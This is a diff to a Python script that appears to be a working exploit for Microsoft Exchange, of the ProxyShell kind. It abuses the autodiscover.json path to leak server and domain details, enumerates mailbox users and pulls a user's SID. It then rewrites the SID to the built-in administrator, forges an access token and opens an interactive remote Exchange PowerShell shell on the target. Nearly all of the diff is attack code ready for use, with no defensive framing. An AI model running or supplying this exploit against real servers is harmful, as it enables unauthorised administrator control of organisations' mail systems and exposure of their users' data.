@@ -1,7 +1,29 @@
+import sys
+
 import base64
+import re
+import urllib3
+import requests
 from struct import pack
 
-def gen_token(uname, sid):
+from pypsrp.powershell import PowerShell, RunspacePool
+from pypsrp.wsman import WSMan
+
+
+urllib3.disable_warnings()
+req = requests.session()
+
+proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "https://127.0.0.1:8080",
+}
+
+http_headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
+    "Cookie": "autodiscover/autodiscover.json/@gmail.com",
+}
+
+def getToken(uname, sid):
     version = 0
     ttype = "Windows"
     compressed = 0
@@ -32,4 +54,113 @@ def gen_token(uname, sid):
 
     return data
 
-print(gen_token("administrator", "S-1-5-21-3458623046-950089817-11695786-500"))
+def exploit(target):
+    try:
+        print(f"[*] Target: {target}")
+
+        resa = req.get(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/owa/any.skin", headers=http_headers, verify=False)
+        try:
+            computer = resa.headers["X-FEServer"]
+        except KeyError:
+            print("[-] No X-FEServer")
+            exit(0)
+        print(f"[+] ComputerName: {computer}")
+
+        resb = req.get(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/ews/exchange.asmx", headers=http_headers, verify=False)
+        try:
+            domain = resb.headers["X-CalculatedBETarget"].split('.',1)[1]
+            print(f"[+] Domain: {domain}")
+        except KeyError:
+            print("[-] No X-CalculatedBETarget")
+            exit(0)
+
+        legacydn = ""
+        with open("users.txt") as filei:
+            users_list = filei.read().splitlines()
+        for user in users_list:
+            email = f"{user}@{domain}"
+            autodiscover_data = f"""<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
+                <Request>
+                    <EMailAddress>{email}</EMailAddress>
+                    <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
+                </Request>
+            </Autodiscover>"""
+
+            ec_headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
+                "Cookie": "email=autodiscover.json/@gmail.com",
+                "Content-Type": "text/xml",
+            }
+            resc = req.post(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/autodiscover.xml", headers=ec_headers, data=autodiscover_data, verify=False)
+            if f"DisplayName" in resc.text:
+                print(f"[+] Email: {email}")
+                legacydn = re.findall('(?:<LegacyDN>)(.+?)(?:</LegacyDN>)', resc.text)
+                break
+            else:
+                print("[-] No LegacyDN")
+                exit(0)
+
+        ed_headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
+            "Cookie": "email=autodiscover/autodiscover.json/@gmail.com",
+            "X-Requesttype": "Connect",
+            "X-Requestid": "{E2EA6C1C-E61B-49E9-9CFB-38184F907552}:123456",
+            "X-Clientinfo": "{2EF33C39-49C8-421C-B876-CDF7F2AC3AA0}:123",
+            "X-Clientapplication": "Outlook/15.0.4815.1002",
+            "Content-Type": "application/mapi-http",
+        }
+        mapi_data = f"{legacydn[0]}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
+        resd = req.post(url=f"{target}/autodiscover/autodiscover.json/@gmail.com/mapi/emsmdb?MailboxId=gmail.com", headers=ed_headers, data=mapi_data, verify=False)
+        try:
+            sid = resd.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
+            print(f"[+] Origin SID: {sid}")
+        except IndexError:
+            print("[-] No SID")
+            exit(0)
+
+        sid_rid = sid.rsplit('-', 1)
+        if sid_rid[1] != "500":
+            sid = sid_rid[0] + "-500"
+        print(f"[+] Fixed SID: {sid}")
+
+        token = getToken(user, sid)
+        print(f"[+] CommonAccessToken: {token}")
+        return token
+
+    except requests.exceptions.RequestException as e:
+        print(f"[ReqError]: {e}\n=>{target}")
+        exit(0)
+
+def execmdlet(server, token, **kwargs):
+    wsman = WSMan(
+        server=server, port=443, cert_validation=False,
+        path=f"/autodiscover/autodiscover.json/@gmail.com/powershell?email=autodiscover/autodiscover.json/@gmail.com&X-Rps-CAT={token}"
+    )
+    with wsman, RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
+        ps = PowerShell(pool)
+        ps.add_script(kwargs["pscript"])
+        ps.invoke()
+
+        if len(ps.output) > 0:
+            stdout = "\n".join(str(line) for line in ps.output)
+            print(stdout)
+        else:
+            stderr = "\n".join(str(line) for line in ps.streams.error)
+            print(stderr)
+
+def main(argv):
+    server = argv[1]
+    target = f"https://{server}"
+    token = exploit(target)
+    while True:
+        pscript = input("\033[92mEPS> \033[0m")
+        if "exit" == pscript:
+            exit(0)
+        execmdlet(server, token, pscript=pscript)
+
+
+if __name__ == "__main__":
+    try:
+        main(sys.argv)
+    except IndexError:
+        print("Usage: python3 34473.py 1.1.1.1")
